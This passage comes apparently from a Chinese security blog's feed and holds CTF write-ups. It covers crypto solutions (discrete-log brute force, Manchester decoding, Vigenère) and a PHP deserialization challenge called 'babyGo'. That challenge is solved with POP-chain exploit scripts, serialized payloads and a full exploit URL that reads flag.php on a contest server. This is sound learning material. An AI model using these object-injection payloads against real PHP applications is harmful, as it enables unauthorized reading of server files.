<code>^</code>为乘方，这是又考察我数论的知识啊…一想到信安数学基础就头皮发麻…直接爆破吧，就是要耗时长一点：<br>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> pow(<span class="number">123852</span>,i,<span class="number">612799081</span>) == (<span class="number">6181254136845</span> % <span class="number">612799081</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHbCfx.png" alt="kHbCfx.png"></p><p><strong><em>java在线反编译链接：<a href="http://www.javadecompilers.com" target="_blank" rel="noopener">http://www.javadecompilers.com</a></em></strong></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="浪漫足球圣地"><a href="#浪漫足球圣地" class="headerlink" title="浪漫足球圣地"></a>浪漫足球圣地</h3><p>百度一下浪漫足球圣地，得到是曼彻斯特，也就是暗示为曼彻斯特编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559</span><br></pre></td></tr></table></figure><p>先转换为2进制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>按照<a href="https://www.ezloo.com/2008/05/manchester_encoding.html" target="_blank" rel="noopener">曼彻斯特编码标准</a>进行转码：<code>&#39;10&#39;-&gt;&#39;0&#39;       &#39;01&#39;-&gt;&#39;1&#39;</code>替换以后正常解码即可；</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">s=<span class="string">"966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559"</span></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res+=<span class="string">'&#123;:04b&#125;'</span>.format(int(i,<span class="number">16</span>))</span><br><span class="line"><span class="comment"># print res</span></span><br><span class="line">fin=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(res),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> res[j:j+<span class="number">2</span>]==<span class="string">'10'</span>:</span><br><span class="line">        fin+=<span class="string">'0'</span></span><br><span class="line">    <span class="keyword">elif</span> res[j:j+<span class="number">2</span>]==<span class="string">'01'</span>:</span><br><span class="line">        fin+=<span class="string">'1'</span></span><br><span class="line"><span class="comment"># print fin</span></span><br><span class="line">flag=int(fin,<span class="number">2</span>)</span><br><span class="line"><span class="comment"># print flag</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&#123;:x&#125;'</span>.format(flag).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3f24e567591e9cbab2a7d2f1f748a1d4&#125;</span><br></pre></td></tr></table></figure><h3 id="hill"><a href="#hill" class="headerlink" title="hill"></a>hill</h3><blockquote><p>Description<br>hill密码，秘钥是3x3矩阵，flag的密文是TCSHXZTCXAPBDKJVJDOHJEAE，flag中含有BABYSHILL，flag是有意义的英文，最终提交格式: hgame{有意义的英文} hint1: <a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Hill_cipher</a> hint2: 模逆元</p></blockquote><p>未完待续……</p><h3 id="Vigener"><a href="#Vigener" class="headerlink" title="Vigener~"></a>Vigener~</h3><blockquote><p>cipher:<br>Zbi Namyrwjk wmhzk cw s eknlgv uz ifuxstlata edhnufwlow xwpz vc mkohk s kklmwk uz mflklagnkh Gswyuv uavbijk, huwwv uh xzw ryxlwxm sx s qycogxx. Ml ay u jgjs ij hgrsedhnufwlow wmtynmlmzcsf. Lny gahnyv ak kuwq lu orvwxmxsfj urv asjpwekhx, tmz cx jwycwlwj upd szniehzm xg txyec az zsj lnliw ukhxmjoyw, ozowl wsxhiv az nlw vkmgjavnmgf ry gzalzvw atxiuzozjjshfi. Ests twgvfi zsby xjakx xg asjpwekhx wfilchloir kunyqwk zbel sxy ikkkhxasrfc Namyrwjk wmhzklw. Af kckzlkyr kadnc lzxyi, Xjoyhjaib Oskomoa ogm xzw lcvkl zi tmtrcwz s myrwjgf qwlnih gx jygahnyvafm Pmywtyvw uojlwjy. Nlw Noaifwxy gahnyv osy ivayohedde xikuxcfwv hs Kagbur Tsznmklg Viddgms af ncw gfk nlgmyurv xopi zmtxvwv ghh xalnc-gfk vsgc Ru gaxxu hwd. Yck. Yaupef Tgnxakzu Fwdruwg, tan xzw ywlwek qek dgnij eomellxcfmlkx xg Trumkw jy Zaykhijw oh xzw tcrwln wiflalc sfj ms suwomjwj cxk hxywwfz heew. lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</p><p>key: guess</p></blockquote><p>在线解密即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Vigenere ciphe is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It is a form of polyalphabetic substitution. The cipher is easy to understand and implement, but it resisted all attempts to break it for three centuries, which earned it the description le chiffre indechiffrable. Many people have tried to implement encryption schemes that are essentially Vigenere ciphers. In eighteen sixty three, Friedrich Kasiski was the first to publish a general method of deciphering Vigenere ciphers. The Vigenere cipher was originally described by Giovan Battista Bellaso in his one thousand five hundred and fifty-one book La cifra del. Sig. Giovan Battista Bellaso, but the scheme was later misattributed to Blaise de Vigenere in the nineth century and so acquired its present name. flag is gfyuytukxariyydfjlplwsxdbzwvqt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;gfyuytukxariyydfjlplwsxdbzwvqt&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>从寒假开了坑，想好好研究一下hgame，一直也没完成，到现在做完两个week也收获到了许多知识（week3，week4就看神仙打架啦，还是萌新，慢慢进步吧），也算是新学期的一点新动力了，纪念第一次hgame，立下flag，下一年继续！！！考研加油！！！</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;平台比赛在2月24号就结束了，只能复现一下，千言万语汇成一句话：爬虫题牛X！！！
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>2019安恒杯1月月赛复现</title>
    <link href="https://gardenia30.top/2019/02/23/2019%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gardenia30.top/2019/02/23/2019安恒杯1月月赛复现/</id>
    <published>2019-02-23T08:06:07.000Z</published>
    <updated>2019-03-03T08:01:03.364Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未完待续…<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h3><p>考察的知识点：</p><ol><li>PHP反序列化；</li><li>POP链的构造；</li></ol><p>此题给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含<code>flag.php</code>，那就是要读取其中的内容即可；发现了<code>unserialize()</code>，又是和php反序列化联系起来，由于还是萌新，所以还只是简单了解反序列化的东西，也就是知道几个魔术方法，从飘零学长的博客了解到是关于pop链的构造，对于pop链的构造一无所知，第一次使用，记录一下； </p><blockquote><p>以前理解的序列化攻击更多的是在魔术方法中出现一些利用的漏洞，因为自动调用从而触发漏洞。但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p></blockquote><p>问题具体分析：</p><ol><li>baby类三个变量：<code>skyobj,aaa,bbb</code>，两个魔术方法：<code>__construct(),__toString()</code>，反序列化时会自动调用；</li><li>其中<code>__construct()</code>定义<code>skyobj</code>是<code>sec类</code>的一个对象，sec类中会调用<code>read()</code>方法；</li><li>其中<code>__toString()</code>调用<code>skyobj</code>的<code>read()</code>方法；</li><li><code>cool</code>类中也是由<code>read()</code>方法的；</li></ol><p>关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">&#123;</span><br><span class="line">    $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">    if (file_get_contents($file))         </span><br><span class="line">    &#123;              </span><br><span class="line">    return file_get_contents($file); </span><br><span class="line">    &#125;  </span><br><span class="line">    else </span><br><span class="line">    &#123; </span><br><span class="line">    return &quot;you must be joking!&quot;; </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常明显是满足<code>$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb</code>即可以读出文件内容，如果构造一个data，使得反序列化后自动调用魔术方法后，通过<code>if判断</code>语句，改变可控变量<code>$filename</code>即可读取到文件内容；</p><p><strong>solution1</strong></p><p>到这里思路就非常明显了：</p><ol><li>从调用<code>sec</code>的<code>read</code>方法改变为调用<code>cool</code>的<code>read</code>方法；</li><li>无需设置$amzing的值，即为NULL，则反序列化后的<code>$this-&gt;nice-&gt;aaa</code>和<code>$this-&gt;nice-&gt;bbb</code>都为NULL，即可成功通过if判断语句；</li></ol><p>构造exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();     <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=O:4:&quot;baby&quot;:3:&#123;s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;&#125;s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line">urlencode(data)=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/23/khLLE6.png" alt="khLLE6.png"></p><p><strong>solution2</strong></p><p>这里的<code>$this-&gt;nice-&gt;aaa</code>被赋值为为止变量<code>$sth</code>，从飘零学长那里学习到另一种构造方法来通过if判断，即通过两个不同的变量名访问同一个内容，无论其中一个怎么变，另一个变量总是指向他现在的值，即可构造如下，：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line">$test-&gt;bbb=&amp;$test-&gt;aaa;</span><br></pre></td></tr></table></figure><p>exp1构造<code>$amzing</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();    <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line">$test-&gt;bbb=&amp;$test-&gt;aaa;    <span class="comment">//指向同一个地址</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>baby%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>skyobj%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>cool%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nice%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>amzing%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>aaa%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>bbb%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A6%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><code>$amzing</code>反序列化后的<code>aaa</code>和<code>bbb</code>就相等了，这里就完成构造<code>$amzing</code>；</p><p>最终exp2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();    <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line"><span class="comment">//$test-&gt;bbb=&amp;$test-&gt;aaa;</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>设置<code>$filename=&#39;flag.php&#39;</code>，设置<code>$amzing</code>即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10009/index.php?data=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>执行顺序分析：</p><ol><li>首先反序列化<code>$data</code>，得到一个baby类的对象；</li><li>默认调用魔术方法，即可调用<code>read</code>；</li><li>反序列化<code>$amzing</code>赋值给<code>$nice</code>，此时的<code>$nice-&gt;aaa</code>和<code>$nice-&gt;bbb</code>相等，可以通过if判断；</li><li>读文件<code>$test-&gt;skyobj-&gt;filename</code>；</li></ol><p><strong>参考链接：</strong><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">pop链构造</a>，<a href="https://skysec.top/2019/01/25/2019%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9BWriteip/" target="_blank" 